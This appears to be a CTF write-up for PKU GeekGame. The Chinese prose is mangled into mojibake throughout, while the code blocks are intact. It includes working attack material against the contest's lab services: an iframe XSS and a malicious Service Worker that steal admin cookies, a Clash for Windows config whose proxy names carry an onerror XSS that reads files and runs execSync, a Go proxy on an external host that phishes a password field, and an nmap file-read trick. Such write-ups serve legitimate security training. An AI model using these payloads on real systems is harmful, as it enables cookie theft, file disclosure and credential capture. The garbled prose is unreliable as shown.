ä»Šå¹´æ²¡ç©ºï¼ˆä¹Ÿæ²¡å¿ƒæƒ…ï¼‰å†™è¯¦ç»†çš„ writeup äº†ï¼Œæ‰€ä»¥åªèƒ½å¤§æ¦‚è®²è®²æˆ‘å¯¹æ¯é“é¢˜çš„æ€è·¯å’Œä¸€äº›è§‚ç‚¹äº†ã€‚æ¯”èµ›ç»“æŸä¹‹åä¹Ÿä¼šæ”¾åœ¨[æˆ‘çš„åšå®¢](https://blog.taoky.moe/)ä¸Šã€‚

<!-- more -->

## ä¸€çœ¼ç›¯å¸§

imagemagick convert å¯ä»¥ç›´æ¥æå– GIF å¸§åˆ°å›¾ï¼Œç„¶å rot13ã€‚

## å°åŒ—é—®ç­”!!!!!

1. ç›´æ¥æœå¾—åˆ° sbatchï¼Œè¿™ä¸ªå‘½ä»¤ä¹Ÿæ˜¯å…¶ä»– slurm çš„è¶…ç®—ä¼šç”¨åˆ°çš„ï¼›
2. <https://github.com/MiCode/Xiaomi_Kernel_OpenSource/blob/corot-t-oss/Makefile>
   ```
   VERSION = 5
   PATCHLEVEL = 15
   SUBLEVEL = 78
   ```
3. <https://everymac.com/ultimate-mac-lookup/?search_keywords=Watch6,16>
4. <https://github.com/PKU-GeekGame/gs-backend/blob/2a1b6743559b95a534e186c4e170eab6b8de5400/src/store/user_profile_store.py#L64>
  
   ä½†æ˜¯çœ‹åˆ°ç‰ˆæœ¬æç¤ºä¹‹åï¼Œç”¨ `nix` è¯•äº†ä¸€ä¸‹å„ä¸ª Python ç‰ˆæœ¬ï¼Œç»“æœå‘ç°è¾“å‡ºæ˜¯ä¸€æ ·çš„â€¦â€¦åæ¥æ‰å‘ç°è‡ªå·±å¿˜è®° `nix-shell` ä¹‹å‰ `deactivate` è™šæ‹Ÿç¯å¢ƒäº†ã€‚
5. <https://zh.wikipedia.org/wiki/Bilibili>

   > 2010å¹´3æœˆ16æ—¥åˆ°5æœˆ6æ—¥ï¼ŒAcFunçˆ†å‘æ··ä¹±å’Œåˆ·çˆ†å¼¹å¹•äº‹ä»¶ï¼Œå¤§é‡è§†é¢‘å¼¹å¹•ä¸­å‡ºç°äº†â€œå¤§é™†æœ€å¥½çš„å¼¹å¹•ç«™**bilibili.us**â€ä»¥åŠâ€œå¤§é™†å–·å­æœ€å¤šçš„å¼¹å¹•ç«™acfun.cnâ€ï¼Œå¤§é‡ä¼šå‘˜æµå‘bilibili[25]ã€‚2011å¹´9æœˆï¼Œæ­å·å¹»ç”µç§‘æŠ€æœ‰é™å…¬å¸æˆç«‹ã€‚

   æ‰€ä»¥å¾—çœ‹ bilibili.us çš„å­˜æ¡£ï¼š<https://web.archive.org/web/20110102140319/http://bilibili.us/video/game.html>
6. æ ¹æ®èµåŠ©å•†ä¿¡æ¯æœåˆ° <http://www.iaspbo.com.cn>ï¼Œå‘ç°è¿™ä¸ªä»€ä¹ˆä¸–ç•Œå¤§ä¼š 2023 å¹´åœ¨å¢æ£®å ¡åŠï¼Œç„¶åæœä¸€ä¸‹å¢æ£®å ¡çŸ¥åæ™¯ç‚¹ï¼ˆè¿™ä¸ªå»ºç­‘è¿˜æŒºæ¼‚äº®çš„ï¼‰ï¼Œç»“æœè¢« <https://cn.tripadvisor.com/Attraction_Review-g190356-d17258920-Reviews-Court_of_Justice_of_the_European_Union-Luxembourg_City.html> å‘äº†ã€‚ä¹‹åæ£€æŸ¥äº†è¡—æ™¯åœ°å›¾æ‰å‘ç°ä¸æ˜¯æ¬§ç›Ÿæ³•é™¢ï¼Œè€Œæ˜¯å¢æ£®å ¡éŸ³ä¹å…ã€‚

## Z å…¬å¸çš„æœåŠ¡å™¨

ç¬¬ä¸€é¢˜ Konsole æ”¶ä¸åˆ°æ–‡ä»¶ï¼ŒåŸå› ä¸æ˜ã€‚

æˆ‘çš„è§£æ³•æ˜¯ç”¨ <https://github.com/enix223/modem>ã€‚è¿™ä¸ªä»£ç åœ¨ Python 3 ä¸‹æœ‰ç‚¹å’Œ bytes/str ç¼–ç æœ‰å…³çš„å°é—®é¢˜ï¼Œä¸ºäº†å·æ‡’ï¼Œç›´æ¥åœ¨æŠ›å¼‚å¸¸çš„åœ°æ–¹ `.encode('iso-8859-1')` äº†ã€‚äºæ˜¯åªéœ€è¦ `getc()` å’Œ `putc()` ä¸¤ä¸ªå‡½æ•°å®šä¹‰å°±è¡Œäº†ã€‚

ç¬¬ä¸€é—®ï¼š

```python
def getc(size, timeout=1):
    # str, but keep bytes unchanged
    return s.recvn(size, timeout=timeout).decode('iso-8859-1')

def putc(data, timeout):
    assert len(data) == 1
    s.send(data)
```

ç¬¬äºŒé—® wireshark æå– raw dataï¼Œç„¶åï¼š

```python
f = open("server", "rb")
data = f.read()
datai = 0

def getc(size, timeout=1):
    # str, but keep bytes unchanged
    global datai
    assert size == 1
    x = data[datai]
    datai += 1
    return chr(x)

def putc(data, timeout):
    pass
```

ç¬¬äºŒé—®æˆ‘ä¹Ÿè¯•è¿‡æ‰‹å†™ parserï¼Œä½†æ˜¯è¾“å‡ºçš„å›¾ç‰‡æœ‰å¾ˆä¸¥é‡çš„ artifactsï¼Œå¯èƒ½æ˜¯å“ªé‡Œæˆ‘æ²¡è€ƒè™‘åˆ°ã€‚

ï¼ˆä¸æ­£ç¡®çš„ï¼‰è§£æä»£ç ï¼š

```python
f = open("flag4.jpg", "rb")
data = f.read()
f2 = open("flag42.jpg", "wb")

rev = False
i = 0
while True:
    ch = data[i]
    i += 1
    if ch in [0x11, 0x91, 0x13, 0x93]:
        print("skip1")
        continue
    if rev is False and ch == 0x18:
        rev = True
        continue
    if rev is True:
        rev = False
        if ch in [0x11, 0x91, 0x13, 0x93, 0x18]:
            print("skip2")
            continue
        if ch in [0x68, 0x69, 0x6a, 0x6b]:
            print(hex(ch))
            if ch == 0x69:
                i += 4
                continue
            elif ch == 0x68:
                break
            #ch = ch
            continue
        elif ch == 0x6c:
            print('7f', hex(ch))
            ch = 0x7f
        elif ch == 0x6d:
            print('ff', hex(ch))
            ch = 0xff
        else:
            if ch & 0x60 == 0x40:
                ch = ch ^ 0x40
            else:
                assert 0
    #if ch == 0x18:
    #    rev = True
    #    continue
    #if rev is True:
    #    if 0x40 <= ch and ch != 0x69:
    #        ch -= 0x40
    #    else:
    #        if ch != 0x69:
    #            print(hex(ch))
    #        i += 8
    #        continue
    #    rev = False
    f2.write(bytes([ch]))
    if i >= len(data):
        break
```
</details>

## çŒ«å’ªçŠ¶æ€ç›‘è§†å™¨

ç›´æ¥çœ‹ `/usr/bin/service` è¿™ä¸ªè„šæœ¬çš„æºä»£ç ï¼Œå¯ä»¥å‘ç°å¾ˆæ˜æ˜¾çš„ã€Œè·¯å¾„ç©¿è¶Šã€é—®é¢˜ã€‚

## åŸºæœ¬åŠŸ

<https://www.freebuf.com/articles/network/255145.html>

## Dark Room

è€å¿ƒç©ä¸€éï¼Œå¯ä»¥å‘ç°é¢˜ç›®åœ°å›¾å’Œå…¬å¼€ä»£ç çš„å‡ ä¹ä¸€è‡´ã€‚ç¬¬ä¸€ä¸ª flag éœ€è¦é€ƒç¦»ä¹‹å sanity è¶…è¿‡ 115ï¼Œå®¡è®¡ä»£ç å¯ä»¥å‘ç°ç”¨é’¥åŒ™å¼€é—¨å¯ä»¥å¢åŠ  sanityï¼Œå¹¶ä¸”å¯ä»¥å¼€äº†åˆå¼€ï¼Œä¸é™æ¬¡æ•°ã€‚

![ç¤ºæ„å›¾](assets/drawing1.png)


ç¬¬äºŒé—®è¾“å…¥éæ•´æ•°ä¼šè¾“å‡ºåŒ…å«ä»£ç çš„ exceptionï¼Œè€Œç”Ÿæˆ 2048 bit ç´ æ•°ä¸æ˜¯ä»€ä¹ˆç‰¹åˆ«å¿«çš„æ“ä½œï¼Œå› æ­¤æ ¹æ®æ—¶é—´å·®å¯ä»¥æ¨æ–­å½“å‰ä½æ˜¯ 1 è¿˜æ˜¯ 0ã€‚

## éº¦æ©Â·åº“æ‹‰å¤«ç‰¹ï¼ˆéƒ¨åˆ†ï¼‰

ä¸ä¼šç© MCã€‚å»æœäº†ä¸€ä¸‹åœ°å›¾ç¼–è¾‘å™¨ï¼Œå‘ç° Minutorï¼Œåœ¨é‡Œé¢æœç´¢ç‰Œå­å¯ä»¥å¾—åˆ°ç¬¬ä¸€ä¸ª flag çš„ä½ç½®ï¼Œç„¶åè¿›æ¸¸æˆåˆ‡åˆ›é€ æ¨¡å¼ tp è¿‡å»å°±è¡Œï¼›ç¬¬äºŒä¸ª flag Minutor æ‰¾ä¸åˆ°ï¼Œæœäº†ä¸€ä¸‹ä¸ MC æœ‰å…³çš„ CTF writeups å‘ç° NBTExplorerï¼Œæ‰“å¼€å­˜æ¡£ç›´æ¥æœ flagï¼Œè¿‡ä¸€æ®µæ—¶é—´ä¸¤ä¸ª flag éƒ½èƒ½æ‰¾åˆ°ã€‚

![ç¤ºæ„å›¾ 2](assets/drawing2.png)


*åˆ›é€ æ¨¡å¼ä¸‹åˆ«ä¸å°å¿ƒç‚¹åˆ°äº†ç‰Œå­ï¼ˆæœ¬å›¾åŸºäºçœŸå®äº‹ä»¶æ”¹ç¼–ï¼‰*


ä»¥ä¸Šå·¥å…·éƒ½å¯ä»¥ç”¨ wine é¡ºåˆ©è¿è¡Œã€‚

ç¬¬ä¸‰ä¸ª flagï¼Œç”±äºå¯¹çº¢çŸ³ç”µè·¯æ²¡æœ‰ä»»ä½•äº†è§£ï¼Œä¸æäº†ã€‚

## Emoji Wordle

flag1 ç›´æ¥çˆ†ç ´ï¼›flag2 cookie ä¸¢åˆ° cyberchef é‡Œé¢ decode jwtã€‚ç›´åˆ°ç¬¬äºŒé˜¶æ®µä¹‹åæˆ‘ä¸€ç›´éƒ½ä»¥ä¸º flag3 æ˜¯åˆ©ç”¨ jwt æ¼æ´ï¼ŒåŒ…æ‹¬è®¾ç½® alg ä¸º noneã€ç”¨ç©ºå¯†é’¥ç­¾åéƒ½è¯•è¿‡ï¼Œæœ€åçªç„¶æ„è¯†åˆ°ï¼Œemoji å°±é‚£ä¹ˆå¤šï¼Œä¹Ÿæ˜¯ç›´æ¥çˆ†ç ´å°±è¡Œäº†ï¼Œåªæ˜¯çˆ†ç ´æ—¶æ¯æ¬¡è¯·æ±‚è¦æºå¸¦ç›¸åŒçš„ sessionï¼Œå¹¶ä¸”åœ¨ä¸€åˆ†é’Ÿå†…å®Œæˆã€‚

## ç¬¬ä¸‰æ–°XSS

ç¬¬ä¸€ä¸ª flag å¥—ä¸ª /admin çš„ iframe ç›´æ¥è¯» iframe é‡Œçš„ cookie å³å¯ï¼Œå› ä¸º Path æ²¡æœ‰ä»»ä½•å®‰å…¨æ€§ä¸Šçš„æ„ä¹‰ã€‚

```html
<iframe src="https://prob99-nxkc2w9v.geekgame.pku.edu.cn/admin" id="a"></iframe>
<script>
setTimeout(() => {document.title=document.getElementById("a").contentDocument.cookie}, 500)
</script>
```

ç¬¬äºŒé—®ä¸€å¼€å§‹è§‰å¾—ä¸å¯æ€è®®ï¼Œåæ¥æƒ³åˆ°ä¼¼ä¹æœ‰äº› web app æ”¯æŒç¦»çº¿è¿è¡Œï¼Œå¥½åƒæ˜¯ Service Workerï¼Œç„¶åå¯ä»¥æ“å‡ºè¿™æ ·ä¸€ä¸ª workerï¼š

```javascript
const CACHE_NAME = 'v2_cache';
const CACHE_FILES = [
];

self.addEventListener('install', function (event) {
    event.waitUntil(
        // Opening cache
        caches.open(CACHE_NAME)
            .then(function (cache) {
                console.log('Opened cache');
                // Adding cache files
                return cache.addAll(CACHE_FILES);
            })
    );
});

self.addEventListener('fetch', function (event) {
    event.respondWith(
        caches.match(event.request).then(function(response) {
            // Check if request URL is "/admin/"
            var url = new URL(event.request.url);
            if (url.pathname === '/admin/') {
                return new Response(
                    '<script>setTimeout(() => {document.title=document.cookie}, 1000) </script>',
                    { headers: { 'Content-Type': 'text/html'}}
                );
            }
            if (response) return response;
            // Else fetch from network
            return fetch(event.request);
        })
    );
});
```

å› ä¸ºæˆ‘ä»¬åªèƒ½æ”¾æ¬¡çº§ç›®å½•ï¼Œæ‰€ä»¥ HTML é‡Œé¢éœ€è¦æ˜¾å¼å†™ `scope: "/"`ï¼š

```html
<!DOCTYPE html>
<html>
<head><link rel="icon" href="data:,"></head>
<body>
<script>
// check if Service Worker is supported
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/swjs2/', { scope: "/" }).then(function(registration) {
    console.log('Service Worker registered with scope:', registration.scope);
  }).catch(function(err) {
    console.log('Service Worker registration failed:', err);
  });
}
</script>
</body>
</html>
```

å¹¶ä¸”ç”Ÿæ•ˆçš„è¿˜éœ€è¦ `/swjs2/` è¯´æ˜è‡ªå·±æ˜¯ä¸ª JS + æœ‰æ•ˆçš„ SW èŒƒå›´æ˜¯æ•´ä¸ªåŸŸåï¼Œè¿™éœ€è¦è¿™æ ·çš„ headerï¼š

```json
{"Content-Type": "application/javascript; charset=UTF-8", "Service-Worker-Allowed": "/"}
```

## ç®€å•çš„æ‰“å­—ç¨¿

ç±»å‹ä½“æ“ã€‚é€šè¿‡è¿”å›çš„ stderr è·å– flagï¼Œå¹¶ä¸” stderr é‡Œé¢ä¸èƒ½æœ‰ flag è¿™ä¸ªå­—ç¬¦ä¸²ã€‚Deno ç›´æ¥ nix-shell è·‘ä¸€ä¸ªå°±è¡Œã€‚

ç¬¬ä¸€é—®ç½‘ä¸Šæ‰¾ä¸ªåˆ‡å‰²å­—ç¬¦ä¸²çš„ typeï¼Œç„¶åï¼š

```typescript
type flag1 = "flag{114514}"

type Split<S extends string, D extends string> =
    string extends S ? string[] :
    S extends '' ? [] :
    S extends `${infer T}${D}${infer U}` ? [T, ...Split<U, D>] : [S];

type zenithal = Split<flag1, "{">[1]

let x: zenithal = "{}"
```

ç¬¬äºŒé—®æ¯”è¾ƒæŠ˜ç£¨ï¼Œå› ä¸º `object | { new (): { v: () => (a: (a: unknown, b: { 'flag{...}': never } & Record<string, string>) => never) => unknown } }` è¿™ä¸ªç±»å‹å®åœ¨å¤ªè¿‡å¥‡æ€ªï¼Œåªèƒ½ä¸€æ­¥ä¸€æ­¥æ‹†ã€‚

```typescript
type flag2 = object | { new (): { v: () => (a: (a: unknown, b: { 'flag{exampleflag}': never } & Record<string, string>) => never) => unknown } }
type zenithal0 = Extract<flag2, { new (): {} }>
// type zenithal0 = new () => {
//     v: () => (a: (a: unknown, b: {
//         'flag{exampleflag}': never;
//     } & Record<string, string>) => never) => unknown;
// }
type zenithal1 = InstanceType<zenithal0>
// type zenithal1 = {
//     v: () => (a: (a: unknown, b: {
//         'flag{exampleflag}': never;
//     } & Record<string, string>) => never) => unknown;
// }
type ExtractFunctionFromConstructedType<T> = T extends { [K in keyof T]: infer V } ? (V extends (...args: any[]) => any ? V : never) : never;
type zenithal2 = ExtractFunctionFromConstructedType<zenithal1>
// type zenithal2 = () => (a: (a: unknown, b: {
//     'flag{exampleflag}': never;
// } & Record<string, string>) => never) => unknown
type zenithal3 = zenithal2 extends (...args: any[]) => infer R ? ExtractParams<R> : never;
// type zenithal3 = [a: (a: unknown, b: {
//     'flag{exampleflag}': never;
// } & Record<string, string>) => never]
type zenithal4 = zenithal3[0]
// type zenithal4 = (a: unknown, b: {
//     'flag{exampleflag}': never;
// } & Record<string, string>) => never
type zenithal5 = Parameters<zenithal4>
// type zenithal5 = [a: unknown, b: {
//     'flag{exampleflag}': never;
// } & Record<string, string>]
type zenithal6 = zenithal5[1]
// type zenithal6 = {
//     'flag{exampleflag}': never;
// } & Record<string, string>

// æ¥ä¸‹æ¥é—®é¢˜æ¥äº†ï¼šæ€ä¹ˆå¤„ç†è¿™ä¸ª intersectionï¼Ÿ
// æˆ‘ä»¬ç¡®å®æœ‰åŠæ³•æŠŠå®ƒå˜æˆä¸€ä¸ª objectï¼Œåƒè¿™æ ·ï¼š
// https://stackoverflow.com/questions/61542365/for-typescript-intersection-type-type-c-a-b-how-to-see-resulting-type-sig
type ExpandOriginal<T> = T extends infer U ? { [K in keyof U]: U[K] } : never;
type soyo0 = ExpandOriginal<zenithal6>
// type soyo0 = {
//     [x: string]: string;
//     'flag{example}': never;
// }
// ä½†æ˜¯è¿™æ ·çš„åæœæ˜¯ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ª value ç±»å‹æ˜¯ never çš„ keyï¼ˆè€Œä¸”è¿™ä¸ªç±»å‹æ˜¯å†²çªçš„ï¼ï¼‰ï¼Œè€Œè¿™æ ·çš„ç±»å‹ä¼¼ä¹ä¼šåœ¨ typescript é‡Œé¢å¸¦æ¥å¾ˆå¤§çš„éº»çƒ¦ã€‚
// è§£å†³æ–¹æ³•æ˜¯ï¼šè§‚å¯Ÿ Expandï¼Œå¯ä»¥å‘ç°æˆ‘ä»¬æœ‰åŠæ³•ææ­» never
type Expand<T> = T extends infer U ? { [K in keyof U]: (U[K] extends [never] ? true : false) } : never;
type zenithal7 = Expand<zenithal6>
// type zenithal7 = {
//     [x: string]: false;
//     'flag{example}': true;
// }
// å¾ˆå¥½ï¼Œç¢äº‹çš„ never æ²¡äº†
type TrueProps<T> = {
  [P in keyof T as T[P] extends true ? P : never]: any
};
// ä¸Šé¢è¿™ä¸ªæ˜¯ GPT-4 å†™çš„ç±»å‹
// æˆ‘åœ¨åé¢åŠ äº† : anyï¼ˆå¦åˆ™ä¼šæŠ¥é”™ https://stackoverflow.com/questions/71019327/mapped-type-compiler-error-when-strict-is-true-mapped-object-type-implicitly-haï¼‰
// ä»¥åŠ `as`, see https://stackoverflow.com/questions/49397567/how-to-remove-properties-via-mapped-type-in-typescript
type zenithal8 = keyof TrueProps<zenithal7>
// type zenithal8 = "flag{example}"
// å¾ˆå¥½ï¼Œäºæ˜¯è¿™ä¸ªé—®é¢˜è§„çº¦åˆ°äº†ç¬¬ä¸€é—®
type zenithal9 = Split<zenithal8, "{">[1]
// flag é‡Œé¢æœ‰ flagï¼Œæ‰€ä»¥åªèƒ½è¿™æ ·å†™åˆ†æ®µè·å–
type zenithal10 = Split<zenithal9, "f">[0]

let x: zenithal10 = {"a": "b"};
```

## é€ç•Œè®¡åˆ’

![HomeAssistant](assets/hass.png)


Home Assistant çš„ integrations çœŸ TM å¾—å¤šã€‚å»æºä»£ç é‡Œå¤´ ripgrep äº† `open\(.+\)` ä¸€æ— æ‰€è·ã€‚

ç¬¬äºŒé˜¶æ®µæç¤ºç”¨ nmapï¼Œé‚£å°±ç®€å•äº†ï¼š

```shell
-F -T4 --min-rate 10 --host-timeout 5s -iL /flag.txt -oN /config/flag
```

ç„¶åå»ºä¸ªå¤‡ä»½ä¸‹ä¸‹æ¥å°±å¥½äº†ã€‚

## éæ³•æ‰€å¾—

è¿™é¢˜æŒºä¸é”™çš„ï¼ŒVNC å’Œ Electron è¿˜èƒ½è¿™ä¹ˆç”¨ï¼Œå­¦åˆ°äº†ã€‚

é¦–å…ˆå¾ˆæ˜æ˜¾æ˜¯ <https://github.com/Fndroid/clash_for_windows_pkg/issues/2710>ã€‚
ç„¶åå¯ä»¥å‘ç° `alert()` èƒ½ç”¨ï¼ˆè™½ç„¶å¼¹äº†ä¹‹åå°±è¦åˆ ç¯å¢ƒé‡æ¥äº†ï¼Œå› ä¸ºé‚£ä¸ªå¼¹æ¡†å…³ä¸æ‰ï¼‰ã€‚

äºæ˜¯è·å¾—ç¬¬ä¸€ä¸ª flagï¼Œéœ€è¦è¯»æ–‡ä»¶ï¼š

```yaml
port: 7890
socks-port: 7891
allow-lan: true
mode: Rule
log-level: info
external-controller: :9090
proxies:
  - name: a<img/src="1"/onerror=eval(`alert(require('fs').readFileSync('/app/profiles/flag.yml'));`);>
    type: socks5
    server: 127.0.0.1
    port: "17938"
    skip-cert-verify: true
  - name: abc
    type: socks5
    server: 127.0.0.1
    port: "8088"
    skip-cert-verify: true

proxy-groups:
  -
    name: <img/src="1"/onerror=eval(`alert(require('fs').readFileSync('/app/profiles/flag.yml'));`);>
    type: select
    proxies:
    - a<img/src="1"/onerror=eval(`alert(require('fs').readFileSync('/app/profiles/flag.yml'));`);>
```

ç¬¬äºŒä¸ª flag éœ€è¦æˆ‘ä»¬å½“ä¸­é—´äººã€‚å…ˆæ‰¾ä¸ª[ä»£ç†çš„å®ç°](https://gist.github.com/yowu/f7dc34bd4736a65ff28d)æ”¹ä¸€æ”¹ï¼š

```go
package main

import (
	"flag"
	"log"
	"net"
	"net/http"
	"strings"
)

// Hop-by-hop headers. These are removed when sent to the backend.
// http://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html
var hopHeaders = []string{
	"Connection",
	"Keep-Alive",
	"Proxy-Authenticate",
	"Proxy-Authorization",
	"Te", // canonicalized version of "TE"
	"Trailers",
	"Transfer-Encoding",
	"Upgrade",
}

func copyHeader(dst, src http.Header) {
	for k, vv := range src {
		for _, v := range vv {
			dst.Add(k, v)
		}
	}
}

func delHopHeaders(header http.Header) {
	for _, h := range hopHeaders {
		header.Del(h)
	}
}

func appendHostToXForwardHeader(header http.Header, host string) {
	// If we aren't the first proxy retain prior
	// X-Forwarded-For information as a comma+space
	// separated list and fold multiple headers into one.
	if prior, ok := header["X-Forwarded-For"]; ok {
		host = strings.Join(prior, ", ") + ", " + host
	}
	header.Set("X-Forwarded-For", host)
}

type proxy struct {
}

func (p *proxy) ServeHTTP(wr http.ResponseWriter, req *http.Request) {
	log.Println(req.RemoteAddr, " ", req.Method, " ", req.URL)

	//http: Request.RequestURI can't be set in client requests.
	//http://golang.org/src/pkg/net/http/client.go
	req.RequestURI = ""

	delHopHeaders(req.Header)

	if clientIP, _, err := net.SplitHostPort(req.RemoteAddr); err == nil {
		appendHostToXForwardHeader(req.Header, clientIP)
	}

	// resp, err := client.Do(req)
	// if err != nil {
	// 	http.Error(wr, "Server Error", http.StatusInternalServerError)
	// 	log.Fatal("ServeHTTP:", err)
	// }
	// defer resp.Body.Close()

	// log.Println(req.RemoteAddr, " ", resp.Status)

	// delHopHeaders(resp.Header)

	// copyHeader(wr.Header(), resp.Header)
	// wr.WriteHeader(resp.StatusCode)
	// io.Copy(wr, resp.Body)
	// wr.WriteHeader(200)
	wr.Header().Set("Content-Type", "text/html")
	wr.Write([]byte("åŸç¥å¯åŠ¨<p id='show'></p><input id='primogem_code' type='password' /><script>var x=document.getElementById('primogem_code'); var y=document.getElementById('show'); setTimeout(() => {y.innerHTML = x.value}, 3000);</script>"))
}

func main() {
	var addr = flag.String("addr", ":19198", "The addr of the application.")
	flag.Parse()

	handler := &proxy{}

	log.Println("Starting proxy server on", *addr)
	if err := http.ListenAndServe(*addr, handler); err != nil {
		log.Fatal("ListenAndServe:", err)
	}
}
```

And then:

```yaml
port: 7890
socks-port: 7891
allow-lan: true
mode: Rule
log-level: info
external-controller: :9090
proxies:
  - name: a
    type: http
    server: aoi.taoky.moe
    port: "19198"
    skip-cert-verify: true
proxy-groups:
  - name: bb
    type: select
    proxies:
      - a
rules:
  - MATCH,a
  - DOMAIN-SUFFIX,pku.edu.cn,a
```

ç„¶åè®¿é—® ys.pku.edu.cn å³å¯ã€‚ä¸Šé¢ä»£ç å¿˜äº†åŠ  html encodingï¼Œä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œåæ­£æ‹¿åˆ° flag äº†ã€‚

ç¬¬ä¸‰é—®å·²çŸ¥å¯ä»¥è¿™ä¹ˆè¯»å–ç¨‹åºè¾“å‡ºï¼š

```javascript
require('child_process').execSync('/app/readflag').toString()
```

äºæ˜¯è§„çº¦åˆ°ç¬¬ä¸€é—®ï¼ŒQ.E.D.

## æ±‰åŒ–ç»¿è‰²ç‰ˆå…è´¹ä¸‹è½½

ä»€ä¹ˆå˜›ï¼Œæˆ‘è¿˜æ˜¯è§£åŒ…è¿‡ kirikiri çš„æ¸¸æˆçš„å˜›ã€‚

ä¹‹å‰å› ä¸º wine è·‘ kirikiri æ¸¸æˆæœ‰ç‚¹é—®é¢˜ï¼ˆä¸»è¦æ˜¯ CPU å ç”¨é«˜å¾—ç¦»è°±ï¼‰ï¼Œæˆ‘ç‰¹åœ°ç ”ç©¶è¿‡æ€ä¹ˆç”¨ krkr çš„å¼€æºå®ç° [krkrsdl2](https://github.com/krkrsdl2/krkrsdl2) è·‘ [SeaBed](https://store.steampowered.com/app/583090/SeaBed/)ï¼ˆç™¾åˆè§†è§‰å°è¯´ï¼Œæ•…äº‹å¾ˆæ„Ÿäººï¼Œæ¨èï¼‰ï¼Œå¦‚æœæœ‰å…´è¶£çš„è¯å¯ä»¥é˜…è¯» <https://notes.taoky.moe/krkrsdl2>ã€‚

ç›´æ¥ç”¨ wine è·‘éœ€è¦è®¾ç½® wine è¯­è¨€ä¸ºä¸­æ–‡ï¼ˆç­‰ä»·äº Windows é‡Œé¢è®¾ç½®ã€Œé Unicode ç¨‹åºçš„è¯­è¨€ã€ï¼‰ï¼Œå¦åˆ™ä½ ä¼šçœ‹åˆ°è¿™ä¸ªï¼š

![ä¹±ç ](assets/krkr-gb2312.png)


ç”¨è„šåè·ŸçŒœæµ‹æ˜¯ Windows çš„ codepage å’Œ A ç³»åˆ— API æœ‰å…³çš„é—®é¢˜ã€‚

æ‰€ä»¥ç¬¬ä¸€é—®ç”¨ <https://github.com/UserUnknownFactor/krkr-xp3> å°±è¡Œã€‚å¦‚æœè¦ç”¨ krkrsdl2 è·‘é¢˜ç›®ï¼Œå¾—æ”¹ä¸€äº›æ–‡ä»¶çš„ç¼–ç ï¼ˆæ”¹åˆ° UTF-16 LE æˆ–è€… UTF-8ï¼‰ï¼Œå¦åˆ™è·‘ä¸èµ·æ¥ã€‚

ç¬¬äºŒé—®å¡äº†å¾ˆä¹…ï¼Œæ”¹è„šæœ¬è·‘åªæ‹¿åˆ°äº† hashï¼Œæ²¡æœ‰åˆ«çš„ä¿¡æ¯ï¼ˆç”¨ Rust å†™äº†ä¸ª BFSï¼Œå·®ç‚¹æŠŠæˆ‘ç¬”è®°æœ¬æåˆ° OOMï¼‰ã€‚åæ¥è¯»åˆ° <https://iyn.me/i/post-45.html>ï¼Œäºæ˜¯ç”¨ KirikiriDescrambler è§£ç äº†å­˜æ¡£ï¼Œç„¶ååˆå¡äº†å¾ˆä¹…ï¼Œæœ€åå‘ç°æœ‰ä¸ª trail çš„å˜é‡ï¼Œæ ‡è¯†äº†æ¯ä¸ªæ ‡ç­¾è®¿é—®äº†å¤šå°‘æ¬¡ã€‚

æœ‰è¿™ä¸ªä¿¡æ¯å°±ç®€å•å¤ªå¤šäº†ï¼š

```python
from more_itertools import distinct_permutations as idp

def cal_hash(p):
    hash = 1337
    for c in p:
        if c == 'A':
            hash = hash * 13337 + 11
        elif c == 'E':
            hash = hash * 13337 + 22
        elif c == 'I':
            hash = hash * 13337 + 33
        elif c == 'O':
            hash = hash * 13337 + 44
        hash = hash % 19260817
    hash = hash * 13337 + 66
    hash = hash % 19260817
    return hash

for cnt, p in enumerate(idp('AAAAAAEEEIOOOOOO')):
    hash = cal_hash(p)
    if hash == 7748521:
        print("Solution:", "".join(p))
        # break
```

è®°å¾—æ‹¿åŸå§‹å­˜æ¡£è§£åŒ…ï¼ä¸ç„¶ trail ä¿¡æ¯æ˜¯é”™çš„ï¼Œä¼šè¢«å‘æ­»ã€‚

åé¢çš„ binary å’Œ algorithm å°±æ²¡æœ‰ç²¾åŠ›å»ç”¨å¿ƒåšäº†ï¼Œæ¯•ç«Ÿ re å’Œ pwn çš„çŸ¥è¯†è¿™å‡ å¹´å·²ç»å…¨å¿˜äº†ï¼Œä¸æ€ä¹ˆç”¨çš„æ•°å­¦çŸ¥è¯†å¤§æ¦‚ç‡ä¹Ÿå·²ç»è¿˜ç»™è€å¸ˆäº†ã€‚

![å¿˜è®°ä¸€åˆ‡](assets/drawing3.png)


## åˆå­¦ C è¯­è¨€ï¼ˆéƒ¨åˆ†ï¼‰

`printf` çš„ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥ä»»æ„æ§åˆ¶ï¼Œæ‰€ä»¥ä¸åœ `%p` è®©å®ƒåå‡ºæ¥å°±è¡Œã€‚

## Baby Stackï¼ˆéƒ¨åˆ†ï¼‰

æ— ç¬¦å· 0-1 = UINT_MAXï¼Œç„¶åå°±å¯ä»¥å‚è€ƒæœ€ç®€å•çš„æ ˆæº¢å‡º pwn åšäº†ã€‚å¦å¤– `coredumpctl gdb` ä¸€ä¸‹å¯ä»¥å‘ç°ï¼Œmovaps ä¸å–œæ¬¢æœªå¯¹é½çš„æ ˆï¼Œæ‰€ä»¥å¾—å…ˆè·³åˆ°ä¸€ä¸ª `ret` ç„¶åå†è·³åˆ° `backdoor`ã€‚

## å…³é”®è¯è¿‡æ»¤å–µï¼Œè°¢è°¢å–µï¼ˆéƒ¨åˆ†ï¼‰

æ„Ÿè§‰æŒºæœ‰æ„æ€çš„é¢˜ç›®ï¼Œå°±æ˜¯å¦‚æœèƒ½å‘ä¸€ä¸‹æµ‹è¯•æ ·ä¾‹å°±æ›´å¥½äº†ã€‚

ç¬¬ä¸€é—®ç‰¹åœ°æç¤ºäº†åè¿›åˆ¶ï¼Œæ‰€ä»¥è§£æ³•æ˜¯ï¼š

```
æŠŠã€(?s).ã€‘æ›¿æ¢æˆã€aã€‘å–µ
æŠŠã€aaaaaaaaaaã€‘æ›¿æ¢æˆã€bã€‘å–µ
æŠŠã€bbbbbbbbbbã€‘æ›¿æ¢æˆã€cã€‘å–µ
æŠŠã€ccccccccccã€‘æ›¿æ¢æˆã€dã€‘å–µ
æŠŠã€ddddddddddã€‘æ›¿æ¢æˆã€eã€‘å–µ

æŠŠã€ecã€‘æ›¿æ¢æˆã€e0cã€‘å–µ
æŠŠã€ebã€‘æ›¿æ¢æˆã€e00bã€‘å–µ
